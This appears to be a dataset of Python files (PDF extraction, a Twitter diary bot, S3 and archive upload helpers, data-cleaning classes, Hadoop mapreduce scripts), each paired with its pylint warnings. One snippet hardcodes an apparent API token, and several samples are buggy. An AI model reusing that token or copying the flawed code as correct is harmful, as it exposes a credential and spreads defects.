15   class PDFExtractor(object):
16   
17       # takes in a parameter of a pdf file
18       # returns the contents as a string
19       def pdf_to_text(self, pdf_file, pages=None):
20           # allows multiple pages to be passed in as a parameter
21           if pages:
22               num_of_pages = set(pages)
23           else:
24               num_of_pages = set()
25           
26           output = StringIO()
27           manager = PDFResourceManager()
28   
29           # parameters require a resource manager and an output text stream
30           converter = TextConverter(manager, output, laparams=LAParams())
31   
32           # parameters require a resource manager and a text converter
33           interpreter = PDFPageInterpreter(manager, converter)
34   
35           input_file = open(pdf_file, 'rb')
36           for page in PDFPage.get_pages(input_file, num_of_pages):
37               interpreter.process_page(page)
38           input_file.close()
39           converter.close()
40   
41           text = output.getvalue()
42           output.close()
43   
44           return text","15 - refactor: useless-object-inheritance
35 - refactor: consider-using-with
15 - refactor: too-few-public-methods
13 - warning: unused-import
"
"1   '''
2   Text Formatter Module
3   
4   This module will format the string input to match the desired output.
5   '''
6   
7   class TextFormatter(object):
8   
9       # takes in a string parameter
10       # returns the string formatted as: 'name TAB title'
11       def name_tab_title(self, text):
12           # stores contents of the input text into a list
13           name_badge = text.split('\n')
14   
15           badges = []
16   
17           # strip the whitepsace from every element
18           for element in name_badge:
19               badges.append(element.strip())
20   
21           # return true from as long as the badge has a blank line
22           while badges.count(''):
23               badges.remove('')
24   
25           # stores the last string added to the badge list as the title
26           title = badges.pop()
27   
28           # stores the first string added to the badge list as the name
29           name = badges.pop()
30   
31           # formats the string as 'name TAB title'
32           name_badge = ('%s\t%s\n' % (name, title))
33           
34           return name_badge
","7 - refactor: useless-object-inheritance
7 - refactor: too-few-public-methods
"
"1   # -*- coding: utf-8 -*-
2   from datetime import datetime
3   #from googletrans import Translator
4   from translate import Translator
5   from TwitterSearch import *
6   
7   import configparser
8   import random
9   import re
10   import io
11   
12   weather = [u""Sunny"", u""Rainy"", u""Cloudy""]
13   weather_tw = [u""晴天"",u""雨天"", u""陰天""]
14   
15   translator= Translator(to_lang='zh-TW')
16   #translator= Translator()
17   
18   cf = configparser.ConfigParser()
19   cf.read('janediary.conf')
20   
21   #consumer_key = cf.get('twitter', 'consumer_key')
22   #consumer_secret = cf.get('twitter', 'consumer_secret')
23   #access_token = cf.get('twitter', 'access_token')
24   #access_token_secret = cf.get('twitter', 'access_token_secret')
25   
26   ts = TwitterSearch(
27       consumer_key = cf.get('twitter', 'consumer_key'),
28       consumer_secret = cf.get('twitter', 'consumer_secret'),
29       access_token = cf.get('twitter', 'access_token'),
30       access_token_secret = cf.get('twitter', 'access_token_secret')
31   )
32   data_path = cf.get('data', 'data_path')
33   
34   tso = TwitterSearchOrder()
35   
36   def get_tweets(keyword_list, num=20, lang='en'):
37       tweets = []
38       try:
39           tso.set_keywords(keyword_list)
40           tso.set_language(lang)
41           i = 0
42           for tweet in ts.search_tweets_iterable(tso):
43               if i == num:  break
44               if tweet['retweeted']: continue
45               tweets.append(tweet)
46               i = i+1
47   
48       except TwitterSearchException as e:
49           print(e)
50   
51       return tweets
52   
53   def generate_jane_story(num=20, lang='en'):
54       tweets = get_tweets(['jane'], num, lang)
55       story = """"
56       for tweet in tweets:
57           story = u""%s %s"" % (story, tweet['text'])
58   
59       return story
60   
61   def clear_up_text(text):
62       text = re.sub(r'RT @\S+: ', '', text)
63       clear_text = re.sub(r'http\S+', '', text)
64       clear_text = remove_emoji(clear_text)
65   
66       return clear_text.strip()
67   
68   def remove_emoji(text):
69       emoji_pattern = re.compile(
70           u""(\ud83d[\ude00-\ude4f])|""  # emoticons
71           u""(\ud83c[\udf00-\uffff])|""  # symbols & pictographs (1 of 2)
72           u""(\ud83d[\u0000-\uddff])|""  # symbols & pictographs (2 of 2)
73           u""(\ud83d[\ude80-\udeff])|""  # transport & map symbols
74           u""(\ud83c[\udde0-\uddff])""  # flags (iOS)
75           ""+"", flags=re.UNICODE)
76   
77       return emoji_pattern.sub(r'', text)
78   
79   def get_translation(input_text, lang='zh-TW'):
80       output = """"
81       try:
82           #output = translator.translate(input_text, dest=lang)
83           output = translator.translate(input_text)
84   
85       except Exception as e:
86           print(e)
87           return """"
88   
89       return output
90   
91   def save_story(filename, text):
92       with io.open(filename,'w',encoding='utf8') as f:
93           f.write(text)
94           f.close()
95   
96   if __name__ == '__main__':
97       jane_story_en = """"
98       clear_story = """"
99       translated_story = """"
100       
101       jane_story_en = generate_jane_story(10, 'en')
102       clear_story = clear_up_text(jane_story_en)
103       print(""---"")
104       print(clear_story)
105       translated_story = get_translation(clear_story[:500])
106       print(""----"")
107       print(translated_story)
108       current_time = datetime.now()
109       weather_idx = random.randrange(3)
110       y, m, d, h = current_time.year, current_time.month, current_time.day, current_time.hour
111       clear_story = u""%s %s\n%s"" % (current_time.strftime('%Y-%m-%d %H:00'), weather[weather_idx], clear_story)
112       translated_story = u""%d年%d月%d日%d時 %s\n%s"" % (y, m, d, h, weather_tw[weather_idx], translated_story)
113   
114       print(clear_story)
115       print(""\n"")
116       print(translated_story)
117       print(""save file"")
118       save_story(""%s/%s.txt"" %(data_path, current_time.strftime(""%Y%m%d"")), clear_story+""\n\n""+translated_story)
119       #save_story(""%s/%s_en.txt"" % (data_path, current_time.strftime(""%Y%m%d"")), clear_story)
120       #save_story(""%s/%s_tw.txt"" % (data_path, current_time.strftime(""%Y%m%d"")), translated_story)
121   
","5 - warning: wildcard-import
12 - warning: redundant-u-string-prefix
12 - warning: redundant-u-string-prefix
12 - warning: redundant-u-string-prefix
13 - warning: redundant-u-string-prefix
13 - warning: redundant-u-string-prefix
13 - warning: redundant-u-string-prefix
26 - error: undefined-variable
34 - error: undefined-variable
48 - error: undefined-variable
57 - warning: redundant-u-string-prefix
70 - warning: redundant-u-string-prefix
85 - warning: broad-exception-caught
79 - warning: unused-argument
111 - warning: redundant-u-string-prefix
112 - warning: redundant-u-string-prefix
"
"1   import numpy as pd
2   import matplotlib.pyplot as plt
3   import pandas as pd
4   
5   dataset=pd.read_csv('music.csv')","2 - warning: unused-import
"
"1   import mediapipe as mp
2   import numpy as np
3   import cv2
4   
5   cap = cv2.VideoCapture(0)
6   
7   facmesh = mp.solutions.face_mesh
8   face = facmesh.FaceMesh(static_image_mode=True, min_tracking_confidence=0.6, min_detection_confidence=0.6)
9   draw = mp.solutions.drawing_utils
10   
11   while True:
12   
13   	_, frm = cap.read()
14   	print(frm.shape)
15   	break
16   	rgb = cv2.cvtColor(frm, cv2.COLOR_BGR2RGB)
17   
18   	op = face.process(rgb)
19   	if op.multi_face_landmarks:
20   		for i in op.multi_face_landmarks:
21   			print(i.landmark[0].y*480)
22   			draw.draw_landmarks(frm, i, facmesh.FACE_CONNECTIONS, landmark_drawing_spec=draw.DrawingSpec(color=(0, 255, 255), circle_radius=1))
23   
24   
25   	cv2.imshow(""window"", frm)
26   
27   	if cv2.waitKey(1) == 27:
28   		cap.release()
29   		cv2.destroyAllWindows()
30   		break
","13 - warning: bad-indentation
14 - warning: bad-indentation
15 - warning: bad-indentation
16 - warning: bad-indentation
18 - warning: bad-indentation
19 - warning: bad-indentation
20 - warning: bad-indentation
21 - warning: bad-indentation
22 - warning: bad-indentation
25 - warning: bad-indentation
27 - warning: bad-indentation
28 - warning: bad-indentation
29 - warning: bad-indentation
30 - warning: bad-indentation
16 - warning: unreachable
2 - warning: unused-import
"
"1   from datetime import datetime
2   
3   def log(data):
4       print('----', datetime.now(), '----')
5       print(data)
6   
7   
8   def logError(error):
9       print('****', datetime.now(), '****')
10       print(error)","Clean Code: No Issues Detected
"
"1   from tattle_helper import register_post, upload_file
2   
3   data = {
4       ""type"" : ""image"",
5       ""data"" : """",
6       ""filename"": ""asdf"",
7       ""userId"" : 169
8   }
9   
10   response = upload_file(file_name='denny.txt')
11   print(response)
12   
13   # register_post(data)","1 - warning: unused-import
"
"1   token = ""78a6fc20-fa83-11e9-a4ad-d1866a9a3c7b"" # add your token here
2   url = ""<base-api-url>/api/posts""
3   try:
4       payload = d
5       payload = json.dumps(payload)
6       headers = {
7           'token': token,
8           'Content-Type': ""application/json"",
9           'cache-control': ""no-cache"",
10           }
11       r = requests.post(url, data=payload, headers=headers)
12       if r.ok:
13           print ('success')
14       else:
15           print ('something went wrong')
16                 
17   except:
18       logging.exception('error in POST request')
19       raise
20                    
21   {
22       ""type"" : ""image"", # can be image, text, video
23       ""data"" : """",
24       ""filename"": ""4bf4b1cc-516b-469d-aa38-be6762d417a5"", #filename you put on s3
25       ""userId"" : 169 # for telegram_bot this should be 169
26   }","4 - error: undefined-variable
5 - error: undefined-variable
11 - error: undefined-variable
18 - error: undefined-variable
21 - warning: pointless-statement
"
"1   import os
2   import json
3   import boto3
4   import requests
5   from logger import log, logError
6   from dotenv import load_dotenv
7   load_dotenv()
8   
9   s3 = boto3.client(""s3"",aws_access_key_id=os.environ.get('S3_ACCESS_KEY'),aws_secret_access_key=os.environ.get('S3_SECRET_ACCESS_KEY'))
10   
11   API_BASE_URL = ""https://archive-server.tattle.co.in""
12   # API_BASE_URL = ""https://postman-echo.com/post""
13   ARCHIVE_TOKEN = os.environ.get('ARCHIVE_TOKEN')
14   
15   def register_post(data):
16   	""""""
17   		registers a post on archive server
18   	""""""
19   	url_to_post_to = API_BASE_URL+""/api/posts""
20   	payload = json.dumps(data)
21   	headers = {
22   		'token': ARCHIVE_TOKEN,
23   		'Content-Type': ""application/json"",
24   		'cache-control': ""no-cache"",
25       }
26   
27   	try:
28   		r = requests.post(url_to_post_to, data=payload, headers=headers)
29   
30   		if r.status_code==200:
31   			log('STATUS CODE 200 \n'+json.dumps(r.json(), indent=2))
32   		else:
33   			log('STATUS CODE '+str(r.status_code)+'\n '+r.text)
34   	except:
35   		log('error with API call')
36   
37   
38   def upload_file(file_name, s3=s3 ,acl=""public-read""):
39   	bucket_name = os.environ.get('TGM_BUCKET_NAME')
40   	#opens file, reads it, and uploads it to the S3 bucket.
41   	try:
42   		with open(file_name, 'rb') as data:
43   			s3.upload_fileobj(data,bucket_name,file_name,ExtraArgs={""ACL"": acl,""ContentType"": file_name.split(""."")[-1]})
44   	except:
45   		logError('ERROR_S3_UPLOAD of '+file_name)
46   	
47   	file_url = ""https://s3.ap-south-1.amazonaws.com/""+bucket_name+""/""+file_name
48   	return file_url
49   
50   def upload_file(file_name, s3=s3 ,acl=""public-read""):
51   	bucket_name = os.environ.get('TGM_BUCKET_NAME')
52   	#opens file, reads it, and uploads it to the S3 bucket.
53   	try:
54   		with open(file_name, 'rb') as data:
55   			s3.upload_fileobj(data,bucket_name,file_name,ExtraArgs={""ACL"": acl,""ContentType"": file_name.split(""."")[-1]})
56   	except:
57   		logError('ERROR_S3_UPLOAD of '+file_name)
58   	
59   	file_url = ""https://s3.ap-south-1.amazonaws.com/""+bucket_name+""/""+file_name
60   	return file_url","16 - warning: bad-indentation
19 - warning: bad-indentation
20 - warning: bad-indentation
21 - warning: bad-indentation
27 - warning: bad-indentation
28 - warning: bad-indentation
30 - warning: bad-indentation
31 - warning: bad-indentation
32 - warning: bad-indentation
33 - warning: bad-indentation
34 - warning: bad-indentation
35 - warning: bad-indentation
39 - warning: bad-indentation
41 - warning: bad-indentation
42 - warning: bad-indentation
43 - warning: bad-indentation
44 - warning: bad-indentation
45 - warning: bad-indentation
47 - warning: bad-indentation
48 - warning: bad-indentation
51 - warning: bad-indentation
53 - warning: bad-indentation
54 - warning: bad-indentation
55 - warning: bad-indentation
56 - warning: bad-indentation
57 - warning: bad-indentation
59 - warning: bad-indentation
60 - warning: bad-indentation
34 - warning: bare-except
28 - warning: missing-timeout
38 - warning: redefined-outer-name
44 - warning: bare-except
50 - error: function-redefined
50 - warning: redefined-outer-name
56 - warning: bare-except
"
"1   #!/usr/bin/env python
2   # -*- coding: utf-8 -*- #
3   from __future__ import unicode_literals
4   
5   AUTHOR = 'Georges Dubus'
6   SITENAME = 'Compile-toi toi même'
7   SITESUBTITLE = u'(Georges Dubus)'         # TODO: remove in next version ?
8   SITEURL = ''
9   ABSOLUTE_SITEURL = SITEURL                # TODO: remove
10   
11   TIMEZONE = 'Europe/Paris'
12   
13   DEFAULT_LANG = 'en'
14   LOCALE = ('en_US.UTF-8', 'fr_FR.UTF8')    # TODO: toujours d'actualité ?
15   
16   THEME = 'stolenidea'
17   
18   # Feed generation is usually not desired when developing
19   FEED_ALL_ATOM = None
20   CATEGORY_FEED_ATOM = None
21   TRANSLATION_FEED_ATOM = None
22   
23   MENUITEMS = (
24   	('Archives', SITEURL + '/archives.html'),
25   	('Tags', SITEURL + '/tags.html')
26   )
27   
28   # Social widget
29   SOCIAL = (
30             ('Github', 'https://github.com/madjar'),
31             ('Twitter', 'http://twitter.com/georgesdubus'),
32             ('Google+', 'https://plus.google.com/u/0/104750974388692229541'),
33            )
34   # TWITTER_USERNAME = 'georgesdubus'
35   
36   DEFAULT_PAGINATION = 10                   # TODO: voir si je dois modifier quelque chose pour ça
37   
38   PATH = ('content')
39   STATIC_PATHS = ['CNAME', 'images', 'slides', '.well-known', '_config.yml']
40   ARTICLE_EXCLUDES = ['slides']
41   
42   # TODO : use buildout to handle the plugin deps ?
43   PLUGIN_PATHS = ['plugins']
44   PLUGINS = ['pelican_youtube']
45   
46   
47   # Uncomment following line if you want document-relative URLs when developing
48   #RELATIVE_URLS = True
","7 - warning: fixme
9 - warning: fixme
14 - warning: fixme
36 - warning: fixme
42 - warning: fixme
7 - warning: redundant-u-string-prefix
"
"1   #!/usr/bin/env python
2   # -*- coding: utf-8 -*-
3   """"""
4   @author: efourrier
5   
6   Purpose : The purpose of this class is too automaticely transfrom a DataFrame
7   into a numpy ndarray in order to use an aglorithm
8   
9   """"""
10   
11   
12   #########################################################
13   # Import modules and global helpers
14   #########################################################
15   
16   from autoc.explorer import DataExploration, pd
17   import numpy as np
18   from numpy.random import permutation
19   from autoc.utils.helpers import cserie
20   from autoc.exceptions import NumericError
21   
22   
23   
24   
25   class PreProcessor(DataExploration):
26       subtypes = ['text_raw', 'text_categorical', 'ordinal', 'binary', 'other']
27   
28       def __init__(self, *args, **kwargs):
29           super(PreProcessor, self).__init__(*args, **kwargs)
30           self.long_str_cutoff = 80
31           self.short_str_cutoff = 30
32           self.perc_unique_cutoff = 0.2
33           self.nb_max_levels = 20
34   
35       def basic_cleaning(self,filter_nacols=True, drop_col=None,
36                          filter_constantcol=True, filer_narows=True,
37                          verbose=True, filter_rows_duplicates=True, inplace=False):
38           """"""
39           Basic cleaning of the data by deleting manymissing columns,
40           constantcol, full missing rows,  and drop_col specified by the user.
41           """"""
42   
43   
44           col_to_remove = []
45           index_to_remove = []
46           if filter_nacols:
47               col_to_remove += self.nacols_full
48           if filter_constantcol:
49               col_to_remove += list(self.constantcol())
50           if filer_narows:
51               index_to_remove += cserie(self.narows_full)
52           if filter_rows_duplicates:
53               index_to_remove += cserie(self.data.duplicated())
54           if isinstance(drop_col, list):
55               col_to_remove += drop_col
56           elif isinstance(drop_col, str):
57               col_to_remove += [drop_col]
58           else:
59               pass
60           col_to_remove = list(set(col_to_remove))
61           index_to_remove = list(set(index_to_remove))
62           if verbose:
63               print(""We are removing the folowing columns : {}"".format(col_to_remove))
64               print(""We are removing the folowing rows : {}"".format(index_to_remove))
65           if inplace:
66               return self.data.drop(index_to_remove).drop(col_to_remove, axis=1)
67           else:
68               return self.data.copy().drop(index_to_remove).drop(col_to_remove, axis=1)
69   
70       def _infer_subtype_col(self, colname):
71           """""" This fonction tries to infer subtypes in order to preprocess them
72           better for skicit learn. You can find the different subtypes in the class
73           variable subtypes
74   
75           To be completed ....
76           """"""
77           serie_col = self.data.loc[:, colname]
78           if serie_col.nunique() == 2:
79               return 'binary'
80           elif serie_col.dtype.kind == 'O':
81               if serie_col.str.len().mean()  > self.long_str_cutoff and serie_col.nunique()/len(serie_col) > self.perc_unique_cutoff:
82                   return ""text_long""
83               elif serie_col.str.len().mean()  <= self.short_str_cutoff and serie_col.nunique() <= self.nb_max_levels:
84                   return 'text_categorical'
85           elif self.is_numeric(colname):
86               if serie_col.dtype == int and serie_col.nunique() <= self.nb_max_levels:
87                   return ""ordinal""
88           else :
89               return ""other""
90   
91       def infer_subtypes(self):
92           """""" Apply _infer_subtype_col to the whole DataFrame as a dictionnary  """"""
93           return {col: {'dtype': self.data.loc[:,col].dtype, 'subtype':self._infer_subtype_col(col)} for col in self.data.columns}
94   
95   
96       def infer_categorical_str(self, colname,  nb_max_levels=10, threshold_value=0.01):
97           """""" Returns True if we detect in the serie a  factor variable
98           A string factor is based on the following caracteristics :
99           ther percentage of unicity perc_unique = 0.05 by default.
100           We follow here the definition of R factors variable considering that a
101           factor variable is a character variable that take value in a list a levels
102   
103           Arguments
104           ----------
105           nb_max_levels: int
106               the max nb of levels you fix for a categorical variable
107           threshold_value : float
108           the nb of of unique value in percentage of the dataframe length
109           """"""
110           # False for numeric columns
111           if threshold_value:
112               max_levels = max(nb_max_levels, threshold_value * self._nrow)
113           else:
114               max_levels = nb_max_levels
115           if self.is_numeric(colname):
116               return False
117           # False for categorical columns
118           if self.data.loc[:, colname].dtype == ""category"":
119               return False
120           unique_value = set()
121           for i, v in self.data.loc[:, colname], iteritems():
122               if len(unique_value) >= max_levels:
123                   return False
124               else:
125                   unique_value.add(v)
126           return True
127   
128       def get_factors(self, nb_max_levels=10, threshold_value=None, index=False):
129           """""" Return a list of the detected factor variable, detection is based on
130           ther percentage of unicity perc_unique = 0.05 by default.
131           We follow here the definition of R factors variable considering that a
132           factor variable is a character variable that take value in a list a levels
133   
134           this is a bad implementation
135   
136   
137           Arguments
138           ----------
139           nb_max_levels: int
140               the max nb of levels you fix for a categorical variable.
141           threshold_value : float
142               the nb of of unique value in percentage of the dataframe length.
143           index: bool
144               False, returns a list, True if you want an index.
145   
146   
147           """"""
148           res = self.data.apply(lambda x: self.infer_categorical_str(x))
149           if index:
150               return res
151           else:
152               return cserie(res)
153   
154       def factors_to_categorical(self, inplace=True, verbose=True, *args, **kwargs):
155           factors_col = self.get_factors(*args, **kwargs)
156           if verbose:
157               print(""We are converting following columns to categorical :{}"".format(
158                   factors_col))
159           if inplace:
160               self.df.loc[:, factors_col] = self.df.loc[:, factors_col].astype(category)
161           else:
162               return self.df.loc[:, factors_col].astype(category)
163   
164       def remove_category(self, colname, nb_max_levels, replace_value='other', verbose=True):
165           """""" Replace a variable with too many categories by grouping minor categories to one """"""
166           if self.data.loc[:, colname].nunique() < nb_max_levels:
167               if verbose:
168                   print(""{} has not been processed because levels < {}"".format(
169                       colname, nb_max_levels))
170           else:
171               if self.is_numeric(colname):
172                   raise NumericError(
173                       '{} is a numeric columns you cannot use this function'.format())
174               top_levels = self.data.loc[
175                   :, colname].value_counts[0:nb_max_levels].index
176               self.data.loc[~self.data.loc[:, colname].isin(
177                   top_levels), colname] = replace_value
","29 - refactor: super-with-arguments
35 - refactor: too-many-arguments
35 - refactor: too-many-positional-arguments
65 - refactor: no-else-return
78 - refactor: no-else-return
81 - refactor: no-else-return
70 - refactor: inconsistent-return-statements
121 - error: undefined-variable
122 - refactor: no-else-return
121 - warning: unused-variable
148 - warning: unnecessary-lambda
149 - refactor: no-else-return
128 - warning: unused-argument
128 - warning: unused-argument
154 - warning: keyword-arg-before-vararg
160 - error: undefined-variable
162 - error: undefined-variable
154 - refactor: inconsistent-return-statements
173 - error: too-few-format-args
16 - warning: unused-import
17 - warning: unused-import
18 - warning: unused-import
"
"1   import seaborn as sns
2   import matplotlib.pyplot as plt
3   
4   
5   def plot_corrmatrix(df, square=True, linewidths=0.1, annot=True,
6                       size=None, figsize=(12, 9), *args, **kwargs):
7       """"""
8       Plot correlation matrix of the dataset
9       see doc at https://stanford.edu/~mwaskom/software/seaborn/generated/seaborn.heatmap.html#seaborn.heatmap
10   
11       """"""
12       sns.set(context=""paper"", font=""monospace"")
13       f, ax = plt.subplots(figsize=figsize)
14       sns.heatmap(df.corr(), vmax=1, square=square, linewidths=linewidths,
15                   annot=annot, annot_kws={""size"": size}, *args, **kwargs)
","5 - refactor: too-many-arguments
5 - refactor: too-many-positional-arguments
5 - warning: keyword-arg-before-vararg
13 - warning: unused-variable
13 - warning: unused-variable
"
"1   """"""
2   @author: efourrier
3   
4   Purpose : This is a simple experimental class to detect outliers. This class
5   can be used to detect missing values encoded as outlier (-999, -1, ...)
6   
7   
8   """"""
9   
10   from autoc.explorer import DataExploration, pd
11   import numpy as np
12   #from autoc.utils.helpers import cserie
13   from exceptions import NotNumericColumn
14   
15   
16   def iqr(ndarray, dropna=True):
17       if dropna:
18           ndarray = ndarray[~np.isnan(ndarray)]
19       return np.percentile(ndarray, 75) - np.percentile(ndarray, 25)
20   
21   
22   def z_score(ndarray, dropna=True):
23       if dropna:
24           ndarray = ndarray[~np.isnan(ndarray)]
25       return (ndarray - np.mean(ndarray)) / (np.std(ndarray))
26   
27   
28   def iqr_score(ndarray, dropna=True):
29       if dropna:
30           ndarray = ndarray[~np.isnan(ndarray)]
31       return (ndarray - np.median(ndarray)) / (iqr(ndarray))
32   
33   
34   def mad_score(ndarray, dropna=True):
35       if dropna:
36           ndarray = ndarray[~np.isnan(ndarray)]
37       return (ndarray - np.median(ndarray)) / (np.median(np.absolute(ndarray - np.median(ndarray))) / 0.6745)
38   
39   
40   class OutliersDetection(DataExploration):
41       """"""
42       this class focuses on identifying outliers
43   
44       Parameters
45       ----------
46       data : DataFrame
47   
48       Examples
49       --------
50       * od = OutliersDetection(data = your_DataFrame)
51       * od.structure() : global structure of your DataFrame
52       """"""
53   
54       def __init__(self, *args, **kwargs):
55           super(OutliersDetection, self).__init__(*args, **kwargs)
56           self.strong_cutoff = {'cutoff_z': 6,
57                                 'cutoff_iqr': 6, 'cutoff_mad': 6}
58           self.basic_cutoff = {'cutoff_z': 3,
59                                'cutoff_iqr': 2, 'cutoff_mad': 2}
60   
61   
62       def check_negative_value(self, colname):
63           """""" this function will detect if there is at leat one
64            negative value and calculate the ratio negative postive/
65           """"""
66           if not self.is_numeric(colname):
67               NotNumericColumn(""The serie should be numeric values"")
68           return sum(serie < 0)
69   
70       def outlier_detection_serie_1d(self, colname, cutoff_params, scores=[z_score, iqr_score, mad_score]):
71           if not self.is_numeric(colname):
72               raise(""auto-clean doesn't support outliers detection for Non numeric variable"")
73           keys = [str(func.__name__) for func in scores]
74           df = pd.DataFrame(dict((key, func(self.data.loc[:, colname]))
75                                  for key, func in zip(keys, scores)))
76           df['is_outlier'] = 0
77           for s in keys:
78               cutoff_colname = ""cutoff_{}"".format(s.split('_')[0])
79               index_outliers = np.absolute(df[s]) >= cutoff_params[cutoff_colname]
80               df.loc[index_outliers, 'is_outlier'] = 1
81           return df
82   
83       def check_negative_value(self):
84           """""" this will return a the ratio negative/positve for each numeric
85           variable of the DataFrame
86           """"""
87           return self.data[self._dfnum].apply(lambda x: self.check_negative_value_serie(x.name))
88   
89       def outlier_detection_1d(self, cutoff_params, subset=None,
90                                scores=[z_score, iqr_score, mad_score]):
91           """""" Return a dictionnary with z_score,iqr_score,mad_score as keys and the
92           associate dataframe of distance as value of the dictionnnary""""""
93           df = self.data.copy()
94           numeric_var = self._dfnum
95           if subset:
96               df = df.drop(subset, axis=1)
97           df = df.loc[:, numeric_var]  # take only numeric variable
98           # if remove_constant_col:
99           # df = df.drop(self.constantcol(), axis = 1) # remove constant variable
100           # df_outlier = pd.DataFrame()
101           for col in df:
102               df_temp = self.outlier_detection_serie_1d(col, cutoff_params, scores)
103               df_temp.columns = [col + '_' +
104                                  col_name for col_name in df_temp.columns]
105               #df_outlier = pd.concat([df_outlier, df_temp], axis=1)
106           return df_temp
","55 - refactor: super-with-arguments
68 - error: undefined-variable
70 - warning: dangerous-default-value
72 - error: raising-bad-type
83 - error: function-redefined
89 - warning: dangerous-default-value
"
"1   __all__ = [""explorer"", ""naimputer""]
2   from .explorer import DataExploration
3   from .naimputer import NaImputer
4   from .preprocess import PreProcessor
5   from .utils.getdata import get_dataset
6   # from .preprocess import PreProcessor
","2 - error: relative-beyond-top-level
3 - error: relative-beyond-top-level
4 - error: relative-beyond-top-level
5 - error: relative-beyond-top-level
1 - error: undefined-all-variable
1 - error: undefined-all-variable
2 - warning: unused-import
3 - warning: unused-import
4 - warning: unused-import
5 - warning: unused-import
"
"1   #!/usr/bin/env python
2   # -*- coding: utf-8 -*-
3   """"""
4   @author: efourrier
5   
6   Purpose : Get data from https://github.com/ericfourrier/autoc-datasets
7   
8   """"""
9   import pandas as pd
10   
11   
12   
13   def get_dataset(name, *args, **kwargs):
14       """"""Get a dataset from the online repo
15       https://github.com/ericfourrier/autoc-datasets (requires internet).
16       Parameters
17       ----------
18       name : str
19           Name of the dataset 'name.csv'
20       """"""
21       path = ""https://raw.githubusercontent.com/ericfourrier/autoc-datasets/master/{0}.csv"".format(name)
22       return pd.read_csv(path, *args, **kwargs)
","Clean Code: No Issues Detected
"
"1   from setuptools import setup, find_packages
2   
3   
4   def readme():
5       with open('README.md') as f:
6           return f.read()
7   
8   setup(name='autoc',
9         version=""0.1"",
10         description='autoc is a package for data cleaning exploration and modelling in pandas',
11         long_description=readme(),
12         author=['Eric Fourrier'],
13         author_email='ericfourrier0@gmail.com',
14         license='MIT',
15         url='https://github.com/ericfourrier/auto-cl',
16         packages=find_packages(),
17         test_suite='test',
18         keywords=['cleaning', 'preprocessing', 'pandas'],
19         install_requires=[
20             'numpy>=1.7.0',
21             'pandas>=0.15.0',
22             'seaborn>=0.5',
23             'scipy>=0.14']
24         )
","5 - warning: unspecified-encoding
"
"1   #!/usr/bin/env python
2   # -*- coding: utf-8 -*-
3   """"""
4   @author: efourrier
5   
6   Purpose : File with all custom exceptions
7   """"""
8   
9   class NotNumericColumn(Exception):
10       """""" The column should be numeric  """"""
11       pass
12   
13   class NumericError(Exception):
14       """""" The column should not be numeric  """"""
15       pass
16   
17   # class NotFactor
","11 - warning: unnecessary-pass
15 - warning: unnecessary-pass
"
"1   #!/usr/bin/python
2   
3   import sys
4   import csv
5   
6   reader = csv.reader(sys.stdin, delimiter='\t')
7   
8   for line in reader:
9       post_id = line[0]
10       post_type = line[5]
11       abs_parent_id = line[7]
12       post_length = len(line[4])
13      
14       if post_id == ""id"":
15          continue
16   
17       if post_type[0] == ""q"": # i.e. if the post is a ""question""
18          print post_id ,""\t"", ""1"", ""\t"", post_length # here, ""1"" indicates ""question""
19   
20       if post_type[0] == ""a"": # i.e. if the post is an ""answer""
21          print abs_parent_id, ""\t"", ""2"", ""\t"", post_length
22          # here ""2"" indicates ""answer"".  The double keys (id and ""1"", ""2"") will make sure that an answer always comes after the corresponding question
","18 - error: syntax-error
"
"1   #!/usr/bin/python
2   
3   import sys
4   
5   oldAuthor = None # save the old author's id
6   hourList = [] # save the list of hours that an author makes posts
7   
8   for line in sys.stdin:
9       data = line.strip().split(""\t"")
10   
11       author, hour = data
12   
13       if oldAuthor and author!=oldAuthor:
14          # if the author changes to a new author, determine the hours of highest frequency, print each of them out
15          LstOfMostFreqHours = set([x for x in hourList if all([hourList.count(x)>=hourList.count(y) for y in hourList])])
16          for i in LstOfMostFreqHours:
17              print oldAuthor,'\t', i
18          oldAuthor = author # set author to the new author
19          hourList = []
20       
21       oldAuthor = author
22       hourList.append(hour)
23   
24   if oldAuthor != None:
25      # for the last author, determine the hours of highest frequency, print each of them out
26      LstOfMostFreqHours = set([x for x in hourList if all([hourList.count(x)>=hourList.count(y) for y in hourList])])
27      for i in LstOfMostFreqHours:
28          print oldAuthor, ""\t"", i
29          
","17 - error: syntax-error
"
"1   #!/usr/bin/python
2   
3   import sys
4   import csv
5   
6   reader = csv.reader(sys.stdin, delimiter='\t')
7   
8   for line in reader:
9       author_id = line[3]
10       added_at = line[8]
11       if len(added_at) > 11:
12          hour = int(added_at[11] + added_at[12])
13          print author_id,""\t"", hour
","13 - error: syntax-error
"
"1   #!/usr/bin/python
2   
3   import sys
4   import csv
5   
6   reader = csv.reader(sys.stdin, delimiter='\t')
7   
8   for line in reader:
9       tag = line[2]
10       
11       tag_list = tag.strip().split(' ')
12       for A_tag  in tag_list:
13           print A_tag
","13 - error: syntax-error
"
"1   #!/usr/bin/python
2   
3   import sys
4   
5   oldQuestionNode = None # save the old question's node id
6   
7   Student_IDs = [] # the list of question/answers/comment id's for a forum thread
8   
9   for line in sys.stdin:
10       data = line.strip().split(""\t"")
11   
12       question_id, author_id = data
13   
14       if oldQuestionNode and oldQuestionNode != question_id:
15          # print the old question's node id, and the list of student id
16          print oldQuestionNode, ""\t"", Student_IDs
17   
18          oldQuestionNode = question_id # set question node ID to that of the new question
19          Student_IDs = [author_id]
20   
21       elif oldQuestionNode:
22            Student_IDs.append(author_id)
23       else:
24            oldQuestionNode = question_id
25            Student_IDs.append(author_id)
26   
27   if oldQuestionNode != None:
28      # for the last question, print question node id, and student IDs
29      print oldQuestionNode, ""\t"", Student_IDs
","16 - error: syntax-error
"
"1   #!/usr/bin/python
2   
3   import sys
4   
5   oldQuestionNode = None # save the old question's node id
6   oldQuestionLength = 0 # save the old question's length
7   AnsLengthList = [] # the list of the length of answers for a question
8   
9   for line in sys.stdin:
10       data = line.strip().split(""\t"")
11   
12       question_id, post_type, post_length = data
13   
14       if oldQuestionNode and oldQuestionNode != question_id: # i.e. it's a new question
15          # print the old question's node id, question length, avg answer length          
16          if AnsLengthList == []:
17             print oldQuestionNode,""\t"",oldQuestionLength,""\t"", 0
18          else:
19             print oldQuestionNode,""\t"",oldQuestionLength,""\t"", sum(AnsLengthList)/len(AnsLengthList)
20   
21   
22          oldQuestionNode = question_id # set question node ID to that of the new question
23          oldQuestionLength = float(post_length)
24          AnsLengthList = []
25   
26       elif oldQuestionNode:
27            AnsLengthList.append(float(post_length))
28       else:
29            oldQuestionNode = question_id
30            oldQuestionLength =float(post_length)
31   
32   if oldQuestionNode != None:
